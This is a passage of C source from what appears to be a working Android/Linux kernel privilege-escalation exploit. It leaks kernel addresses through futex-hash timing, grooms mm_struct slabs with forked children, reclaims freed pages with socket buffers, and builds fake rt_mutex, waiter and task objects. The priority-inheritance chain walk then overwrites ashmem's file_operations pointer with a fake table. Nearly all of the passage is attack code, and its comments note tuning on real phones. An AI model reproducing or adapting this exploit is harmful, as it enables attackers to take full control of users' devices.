   * subtracting a tunable delta from the unslid alias. */
  return p0_data_alias(image_addr) - g_linear_map_delta;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* Read back SKB data from the reclaim socket after the PI chain walk.
 * The kernel may have modified the SKB data at page_base (rb ops,
 * waiter->prio = task->prio copy).  recvmsg lets us see the kernel's
 * copy, giving us a read primitive for the controlled page. */
uint32_t ks_leak_readback(void) {
  if (reclaim_sv[1] < 0 || !page_image.buf) {
    pr_warning("KS_LEAK no socket or buf sv=%d buf=%p\n",
               reclaim_sv[1], (void *)page_image.buf);
    return 0;
  }

  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  size_t prio_off = (size_t)W0_OFF + 0x40;
  size_t lock_off = (size_t)LOCK_OFF;
  uint32_t orig = FAKE_WAITER_PRIO;
  uint32_t leak = 0;
  ks_leak_walk_touched = 0;

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) {
      pr_info("KS_LEAK recv %d n=%zd errno=%d\n", i, n, errno);
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    if (prio_off + 4 > check) continue;

    uint32_t got;
    memcpy(&got, rbuf + prio_off, 4);
    uint32_t wait_lock;
    memcpy(&wait_lock, rbuf + lock_off, 4);
    pr_info("KS_LEAK skb[%d] wait_lock=0x%08x prio=0x%08x orig=0x%08x %s\n",
            i, wait_lock, got, orig, got != orig ? "LEAK!" : "same");
    if (wait_lock != 0) {
      pr_success("KS_LEAK wait_lock MODIFIED: chain walk trylocked "
                 "our fake_lock! pi_blocked_on was non-NULL!\n");
    }
    if (wait_lock != 0 || got != orig) {
      ks_leak_walk_touched = 1;
    }
    pr_info("KS_LEAK skb[%d] prio_off=0x%zx val=0x%08x orig=0x%08x %s\n",
            i, prio_off, got, orig, got != orig ? "LEAK!" : "same");
    if (got != orig) {
      leak = got;
      break;
    }
  }
  return leak;
}

/* Read back the head queued reclaim skb without consuming it.  This is a
 * recvmsg(MSG_PEEK) on the receiving socket: it proves the skb payload we
 * queued is intact, NOT that the frag page occupies page_image.base.  The
 * page at base is only proven by a kernel read or by the punch surviving. */
void ks_page_peek_report_at(const char *tag) {
  if (!page_image.built) {
    pr_info("KS_PAGE_PEEK tag=%s unavailable reason=no-image\n", tag);
    return;
  }
  if (reclaim_sv[1] < 0) {
    pr_info("KS_PAGE_PEEK tag=%s unavailable reason=no-socket\n", tag);
    return;
  }
  static unsigned char pbuf[SKB_SEND_SIZE];
  struct iovec iov = { pbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  errno = 0;
  ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_PEEK | MSG_DONTWAIT);
  size_t need = page_image.bias + (size_t)LOCK_OFF + 6 * sizeof(uint64_t);
  if (n <= 0 || (size_t)n < need) {
    pr_info("KS_PAGE_PEEK tag=%s unavailable ret=%zd errno=%d need=%zu\n",
            tag, n, errno, need);
    return;
  }
  uint64_t q[6];
  memcpy(q, pbuf + page_image.bias + LOCK_OFF, sizeof(q));
  int ours = q[2] == page_image.want_rb &&
             q[3] == page_image.want_leftmost &&
             q[4] == page_image.want_owner;
  size_t zero = 0;
  for (ssize_t i = 0; i < n; i++) {
    if (pbuf[i] == 0) zero++;
  }
  uint64_t head[4];
  memcpy(head, pbuf, sizeof(head));
  pr_info("KS_PAGE_PEEK tag=%s scope=skb-readback base=%016zx bytes=%zd "
          "skb_match=%d lock=%016zx rb=%016zx leftmost=%016zx owner=%016zx "
          "want_rb=%016zx want_leftmost=%016zx want_owner=%016zx "
          "zero=%zu/%zd head=%016zx,%016zx,%016zx,%016zx\n",
          tag, (size_t)page_image.base, n, ours,
          (size_t)q[0], (size_t)q[2], (size_t)q[3], (size_t)q[4],
          (size_t)page_image.want_rb, (size_t)page_image.want_leftmost,
          (size_t)page_image.want_owner, zero, n,
          (size_t)head[0], (size_t)head[1], (size_t)head[2], (size_t)head[3]);
  if (!ours) {
    size_t fake_lock_hits = 0;
    size_t fake_task_hits = 0;
    for (size_t off = 0; off + sizeof(uint64_t) <= (size_t)n; off += 8) {
      uint64_t v;
      memcpy(&v, pbuf + off, sizeof(v));
      if (v == (uint64_t)fake_lock) fake_lock_hits++;
      if (v == (uint64_t)fake_task) fake_task_hits++;
    }
    pr_info("KS_PAGE_PEEK foreign zero_page=%d fake_lock_hits=%zu "
            "fake_task_hits=%zu lock_q=%016zx,%016zx,%016zx,%016zx,%016zx,"
            "%016zx\n",
            zero == (size_t)n, fake_lock_hits, fake_task_hits,
            (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3],
            (size_t)q[4], (size_t)q[5]);
  }
}

void ks_page_peek_report(void) {
  ks_page_peek_report_at("pre-punch");
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* H1A-only diagnostic: dump every qword that differs from the payload we
 * sent into the reclaim socket.  This gives a direct answer to whether the
 * PI chain wrote anywhere inside the controlled page, rather than relying
 * on the two hand-picked fields checked by ks_leak_readback(). */
void ks_leak_diff_dump(void) {
  if (reclaim_sv[1] < 0 || !page_image.buf) {
    pr_warning("KS_DIFF no socket or buf sv=%d buf=%p\n",
               reclaim_sv[1], (void *)page_image.buf);
    return;
  }

  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) {
      pr_info("KS_DIFF recv %d n=%zd errno=%d\n", i, n, errno);
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    size_t diff_count = 0;
    for (size_t off = 0; off + sizeof(uint64_t) <= check; off += sizeof(uint64_t)) {
      uint64_t old;
      uint64_t got;
      memcpy(&old, page_image.buf + off, sizeof(old));
      memcpy(&got, rbuf + off, sizeof(got));
      if (old == got) continue;
      if (diff_count < 16) {
        pr_info("KS_DIFF skb=%d off=0x%zx old=%016llx new=%016llx\n",
                i, off, (unsigned long long)old,
                (unsigned long long)got);
      }
      diff_count++;
    }
    pr_info("KS_DIFF skb=%d bytes=%zu diffs=%zu\n", i, check, diff_count);
  }
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: pread/pwrite call f_op->read/write directly; configfs_read_file /
   * configfs_write_bin_file have exactly those signatures on 4.19 */
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
#endif
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* A forked child inherits the parent's fd table.  The ctx memfds are
 * /proc/<pid>/mem files, and each one holds mm_count on another child's
 * mm_struct (proc_mem_open does mmgrab; mem_release does the matching
 * mmdrop).  A long-lived child -- the every-eighth kept spray fillers --
 * would pin every earlier child's mm, so the pre-fire sweep's close and
 * kill could never reach the last reference.  Drop those inherited files
 * in the child; the parent keeps its own. */
static void close_inherited_memfds(void) {
  struct mm_ctx *ctxs[5] = {&prepare_ctx, &spray_ctx, &lead_ctx, &pre_ctx,
                            &post_ctx};
  for (int c = 0; c < 5; ++c) {
    struct mm_ctx *ctx = ctxs[c];
    if (ctx->memfds == NULL) {
      continue;
    }
    for (size_t i = 0; i < ctx->mm_cnt; ++i) {
      if (ctx->memfds[i] > 2) {
        close(ctx->memfds[i]);
      }
    }
  }
}


static int task_cpu_hint(pid_t pid) {
  char path[64];
  char buf[1024];
  int fd;
  int n;
  char *close_paren;
  char *q;
  int field;
  if (pid <= 0) {
    return -1;
  }
  snprintf(path, sizeof(path), "/proc/%d/stat", (int)pid);
  fd = open(path, O_RDONLY);
  if (fd < 0) {
    return -1;
  }
  n = (int)read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = 0;
  close_paren = strrchr(buf, 0x29);
  if (close_paren == NULL) {
    return -1;
  }
  field = 2;
  for (q = close_paren + 1; *q != 0; q++) {
    if (*q == 32) {
      field++;
      if (field == 39) {
        return atoi(q + 1);
      }
    }
  }
  return -1;
}

/* State character from /proc/<pid>/stat ('R','S','D','Z',...) or 0 when the
 * task is gone.  A zombie has already run exit_mm(), so its mm free is in the
 * past and the anchor slot it owned may have been reused. */
static int task_state_char(pid_t pid) {
  char path[64];
  char buf[512];
  char *p;
  int fd;
  ssize_t n;
  snprintf(path, sizeof(path), "/proc/%d/stat", (int)pid);
  fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  p = strrchr(buf, ')');
  if (p == NULL || p[1] != ' ') {
    return 0;
  }
  return (unsigned char)p[2];
}

pid_t clone_child_cpu(size_t cpu) {
  if (pin_rw[0] < 0 && pipe(pin_rw) != 0) {
    pin_rw[0] = -1;
    pin_rw[1] = -1;
  } else if (pin_rw[0] >= 0) {
    int fl = fcntl(pin_rw[0], F_GETFL, 0);
    if (fl >= 0) {
      (void)fcntl(pin_rw[0], F_SETFL, fl | O_NONBLOCK);
    }
  }
  int slot = pin_slot_next++;
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    close_inherited_memfds();
    pin_to_core(cpu);
    /* Report the CPU the pin actually produced, so a child killed before it
     * ran pin_to_core() cannot look pinned. */
    if (pin_rw[1] >= 0 && slot >= 0 && slot < KS_PIN_SLOTS) {
      int rep[2];
      rep[0] = slot;
      rep[1] = (int)sched_getcpu();
      SYSCHK(write(pin_rw[1], rep, sizeof(rep)));
    }
    for (;;) {
      pause();
    }
  }
  pin_slot_of_last = (slot >= 0 && slot < KS_PIN_SLOTS) ? slot : -1;
  return child;
}

pid_t clone_child(void) { return clone_child_cpu(CORE); }

/* Put the EMPTYING_CPU mm cache active slab on a slab of ours: a process
 * pinned there forks a slab worth of mm-bearing children, so the page the
 * chain empties can never be that CPU c->page and its free must enter
 * __slab_free instead of the do_slab_free fastpath.  The forks are real
 * allocations on that CPU, so the parent must not run the emptying free
 * until they are done: report[0] is the fork count, report[1] the CPU the
 * seeder actually ran on, written to ready_fd after the last fork. */
pid_t clone_seeder(int slots, int ready_fd) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    close_inherited_memfds();
    pin_to_core(EMPTYING_CPU);
    /* One more than a slab: the extra fork deactivates the filled slab onto
     * the node full list, so its remaining objects are still there when the
     * drain request frees one of them, and that free takes __slab_free's
     * put_cpu_partial(drain=1) path on this CPU. */
    int pids[64];
    int forked = 0;
    for (int i = 0; i < slots + 1 && forked < (int)(sizeof(pids) / sizeof(pids[0]));
         i++) {
      pid_t g = clone_child_cpu(EMPTYING_CPU);
      if (g <= 0) {
        break;
      }
      pids[forked++] = (int)g;
    }
    {
      int report[2];
      report[0] = forked;
      report[1] = (int)sched_getcpu();
      SYSCHK(write(ready_fd, report, sizeof(report)));
    }
    (void)pids;
    for (;;) {
      pause();
    }
  }
  return child;
}


pid_t clone_leak_child(void) {
  /* Run the whole KernelSnitch scan in a forked child.  futex_hash() hashes
   * current->mm, so the address recovered here belongs to THIS child, whose
   * mm_struct is freed when the child is killed.  The previous design ran
   * the scan in the parent, so the leaked mm was the exploit's own live mm:
   * that slab never becomes empty, the order-3 SKB spray can never take it,
   * and every KS_PAGE_PROBE punch dereferenced a live mm_struct. */
  /* fork(), not raw clone: this child's whole purpose is that its mm is a
   * different mm_struct from the exploit's.  The previous raw
   * syscall(SYS_clone, SIGCHLD, ...) here produced a child that reported the
   * parent's pid from getpid() while the parent's clone returned a different
   * pid, so the scan's leaked mm could be the still-live payload's own mm and
   * the target kill then freed nothing.  fork() is the libc path that
   * guarantees a separate mm and a self-consistent pid/tgid. */
  pid_t child = fork();
  if (child < 0) {
    pr_error("KS_LEAK fork failed errno=%d\n", errno);
    return -1;
  }
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    /* The leak child is cloned AFTER prepare_ctx/spray_ctx memfds are open,
     * so without this it inherits ~1536 /proc/<pid>/mem fds and keeps every
     * filler mm alive past the sweep's close+kill.  That is what held 48
     * slabs (1568 objects) until the target itself died in the isolation
     * run: post-isolate 2113/70 -> post-target-free 545/22. */
    close_inherited_memfds();
    pin_to_core(CORE);
    kernelsnitch_find_collisions(ks);
    if (kernelsnitch_found_collisions(ks)) {
      run_kernelsnitch_bruteforce();
    }
    fflush(stdout);
    /* Stay on CORE.  This child is now a filler of the anchor slab, so its mm
     * free must land on the CPU the crossing drains; the slab's last live
     * object is a plain child parked on the escaped CPU instead.  Leaving it
     * on CORE also keeps the slab's freeze on the draining CPU. */
    pr_info("KS_TARGET_CHILD_CPU pid=%d cpu=%d\n", (int)getpid(),
            sched_getcpu());
    /* Alive until the freeze: this child's mm is the address the chain plants
     * at and the slab slot that the measured discard proves was advertised. */
    for (;;) {
      pause();
    }
  }
  pr_info("KS_LEAK child pid=%d (forked mm target)\n", (int)child);
  return child;
}

/* The scan runs inside the leak child, so the leaked mm (and the 31 pre_ctx
 * neighbours that share its slab) must stay allocated until it reports a
 * verdict.  The child exits by itself afterwards; it is reaped by
 * reap_leak_child() so its mm object is freed at exactly that moment. */
static void wait_leak_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  for (int i = 0; i < 2400; i++) {
    int state = ks ? (int)ks->state : (int)KERNELSNITCH_MM_NOT_FOUND;
    if (state == (int)KERNELSNITCH_MM_FOUND ||
        state == (int)KERNELSNITCH_MM_NOT_FOUND ||
        state == (int)KERNELSNITCH_COLLISIONS_NOT_FOUND) {
      pr_info("KS_LEAK child pid=%d done state=%d\n", (int)child, state);
      return;
    }
    usleep(500000);
  }
  pr_warning("KS_LEAK child pid=%d scan timeout state=%d\n", (int)child,
             ks ? (int)ks->state : -1);
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(page_image.buf);
  page_image.buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  /* 16 slabs, not 6: 7/8 of them are freed into stable partial slabs so
   * that n->nr_partial stays above s->min_partial while the target slab is
   * released (see the release sequence in prepare_kernel_page). */
  spray_ctx.mm_cnt = (1 + 3 * MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  /* Capacity for the lead children: the previous slab can hold at most
   * mm_objs_per_slab - 1 objects before it fills, and the allocation that
   * starts the next slab is the first target filler.  The actual lead count
   * is fixed by watching the cache's slabdata at fork time. */
  lead_ctx.mm_cnt = mm_objs_per_slab + 1;
  lead_ctx.childs = calloc(sizeof(pid_t), lead_ctx.mm_cnt + 1);
  lead_ctx.memfds = calloc(sizeof(int), lead_ctx.mm_cnt + 1);
  pre_ctx.mm_cnt = mm_objs_per_slab;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

/* Numeric view of the same line mm_slab_log() prints: the mm cache's live
 * objects and its slab count.  ``slabs`` dropping is the observable proof that
 * an emptied slab was discarded and its order-3 page returned to the buddy
 * allocator - which is exactly the state the skb spray needs. */
/* Parse the mm_struct line from an already-open slabinfo FILE.  The file must
 * be positioned at its start; the caller opens it (which allocates only small
 * kernel objects) before the discard window and lets the first read allocate
 * the seq buffer afterwards. */
const char *ghostlock_dir(void) {
  const char *dir = getenv("GHOSTLOCK_DIR");
  return (dir && *dir) ? dir : "/data/local/tmp";
}

/* Eight slots: every current call site passes at most two of these into a
 * single expression, so a short ring cannot alias a live path. */
const char *ghostlock_path(const char *leaf) {
  static char ring[8][256];
  static unsigned next;
  char *out = ring[next++ & 7u];
  snprintf(out, sizeof(ring[0]), "%s/%s", ghostlock_dir(), leaf);
  return out;
}

/* Phase timer: the leak dominates the cycle cost and has to be measured,
 * not guessed, before any scan-window tuning is meaningful. */
static double ks_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (double)ts.tv_sec * 1000.0 + (double)ts.tv_nsec / 1000000.0;
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  if (page_image.buf == NULL) {
    page_image.buf = malloc(SKB_SEND_SIZE);
  }
  if (page_image.buf == NULL) {
    return 0;
  }
  memset(page_image.buf, 0, SKB_SEND_SIZE);
  page_image.base = base;
  page_image.bias = (size_t)SKB_FRAG_BIAS;
  page_image.mode = payload_mode;
  page_image.built = 0;

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  size_t s2_used_end = (size_t)SKB_FRAG_BIAS +
                       FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  if (payload_mode == PAGE_PAYLOAD_S2 &&
      (s2_used_end > SKB_SEND_SIZE ||
       (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE)) {
    pr_error("S2 payload prefix exceeds controlled skb size end=%zu\n",
             s2_used_end);
    return 0;
  }

  if (getenv("KS_PAGE_PROBE")) {
    /* Page-identity probe.  The whole blob is zero-initialised, so the walk at
     * [lock + 0x18] sees zero only when the frag page really is the slab that
     * held the leaked mm. */
    unsigned char *pp = page_image.buf + SKB_FRAG_BIAS;
    put64(pp, 0x18, 0);
    pr_info("KS_PAGE_PROBE base=%016zx read_at=%016zx blob_off=%x\n",
            (size_t)base, (size_t)(base + 0x18), (unsigned)(SKB_FRAG_BIAS + 0x18));
  }
  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* rb_erase() stores the child at parent->rb_right == parent + 0x8, so
     * parent must be misc_fops - 8 to install fake_fops in that slot. */
    fake_parent = (data_addr(ASHMEM_MISC_FOPS) - 8) | 1;
    fake_right = fake_fops;
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    /* rt_mutex_dequeue_pi(fake_task, fake_w0) erases fake_w0's pi_tree_entry
     * with rb_left == 0, so __rb_change_child() takes the rb_right branch and
     * rb_erase_cached() does
     *     *(parent + 0x8) = child
     * (verified in the shipped image: str x8,[x9,#8] and str x11,[x9,#0x10]
     * are the only child stores).  Aim parent 0x8 below the misc_fops slot
     * and make child the fake table: ashmem_misc.fops = fake_fops. */
    write_pc = data_addr(ASHMEM_MISC_FOPS) - 0x8;
    write_right = fake_fops;
    write_left = 0;
  }
  /* FOPS mode now also runs without slide (alioth pselect route is dead),
   * so text_addr(INIT_TASK) would return an uncalibrated vmalloc address.
   * Keep every PI-chain pointer inside the controlled page for both
   * payload modes so a partial route cannot fault or spin on garbage. */
  waiter_task = fake_task;
  task_group = fake_task;
  pi_top_task = fake_task;

  /* Bytes the fake objects actually occupy.  The SKB buffer is
   * ORDER3_SIZE - SKB_SHARED_INFO_ALIGNED bytes, so bounding this loop by
   * ORDER3_SIZE can never be true: the loop used to be skipped entirely and
   * the fake page kept the 0x41 fill, which made fake_lock->wait_lock
   * 0x41414141 and spun rt_mutex_adjust_prio_chain() in its trylock retry
   * path until the phone locked up. */
  size_t payload_end = (size_t)W0_OFF + FAKE_WAITER_WW_CTX_OFF + 8;
  if ((size_t)LOCK_OFF + RT_MUTEX_OWNER_OFF + 8 > payload_end) {
    payload_end = (size_t)LOCK_OFF + RT_MUTEX_OWNER_OFF + 8;
  }
  if ((size_t)FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8 > payload_end) {
    payload_end = (size_t)FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  }
  if ((size_t)FOPS_TABLE_OFF + 0x80 > payload_end) {
    payload_end = (size_t)FOPS_TABLE_OFF + 0x80;
  }
  if ((size_t)SKB_FRAG_BIAS + payload_end > SKB_SEND_SIZE) {
    pr_error("payload does not fit in the skb buffer end=%zu size=%d\n",
             payload_end, SKB_SEND_SIZE);
    return 0;
  }

  size_t filled_chunks = 0;
  for (size_t chunk = 0;
       chunk + (size_t)SKB_FRAG_BIAS + payload_end <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    unsigned char *p = page_image.buf + chunk + SKB_FRAG_BIAS;
    filled_chunks++;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* Two-level PI chain within our controlled page:
       * stale_waiter -> fake_lock (trylock OK) -> owner = fake_task
       * -> fake_task->pi_blocked_on = fake_w0 -> fake_w0->lock =
       * fake_lock -> prio mismatch -> adjustment -> fake_w0->prio =
       * fake_task->prio.  We can read the prio change via recvmsg! */
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
      put64(p, LOCK_OFF + RT_MUTEX_LEFTMOST_OFF, fake_w0);
      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);
    } else {
      /* The walk reads rb_leftmost as the top waiter and checks
       * top_waiter->lock (+0x38) against this lock before following the
       * chain to the owner and the PI-tree erase.  Leave fake_w0 there so
       * that erase is reachable; a zero here ends the walk at +0x300 and
       * never performs the write. */
      put64(p, LOCK_OFF + RT_MUTEX_WAITERS_OFF, fake_w0);
      put64(p, LOCK_OFF + RT_MUTEX_LEFTMOST_OFF, fake_w0);
      put64(p, LOCK_OFF + RT_MUTEX_OWNER_OFF, fake_task | 1);
      /* KS_SENTINEL_LOCK walks fake_task as the lock.  Every word the fill
       * does not write stays 0x41 poison, so +0x18 needs an explicit zero
       * (the walk's cbz at +0x300) and +0x20 an explicit "no owner". */
      put64(p, FAKE_TASK_OFF + 0x18, 0);
      put64(p, FAKE_TASK_OFF + 0x20, 0);
    }

    /* SELF_CONSISTENT_LOCK_TASK: the chain may take fake_lock as the rt_mutex
     * and as the owning task_struct.  Shape both views inside the page so no
     * dereference escapes it. */
    put64(p, LOCK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, fake_w0);
    put32(p, LOCK_OFF + FAKE_TASK_PRIO_OFF, FAKE_WAITER_PRIO + 16);
    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    /* Chain-walk safety: rt_mutex_adjust_prio_chain reads the top waiter
     * of the fake lock via rb_leftmost and then checks
     * top_waiter->lock (real layout offset +0x38) == current lock.
     * In the fake page, +0x38 is also pi_tree_entry.rb_left (write_left).
     * Override it to fake_lock so the sanity check passes and the walk
     * exits cleanly (fake_task->pi_blocked_on = 0). */
